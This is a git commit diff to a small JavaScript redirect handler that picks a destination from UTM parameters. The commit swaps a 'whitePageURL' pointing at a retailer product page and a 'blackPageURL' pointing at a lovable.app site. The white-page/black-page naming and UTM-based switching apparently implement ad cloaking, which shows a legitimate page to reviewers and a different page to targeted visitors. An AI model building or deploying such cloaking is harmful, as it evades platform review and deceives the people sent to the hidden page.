96e447bb6d9fa5da9eb746a7413bc735414f1824
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-19 08:27:12 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.mumzworld.com/en/dr-browns-120ml-glass-narrow-options-bottle-pack-of-2?source=Brand+Page";
-    const blackPageURL = "https://luvcshap.lovable.app/";
+    const whitePageURL = "https://www.centrepointstores.com/ae/en/Men/Clothing/T-shirts-%26-Polos/T-shirts/APPAREL-GROUP-Levi%27s-Logo-Crew-Neck-Short-Sleeves-T-Shirt/p/568090027Grey";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
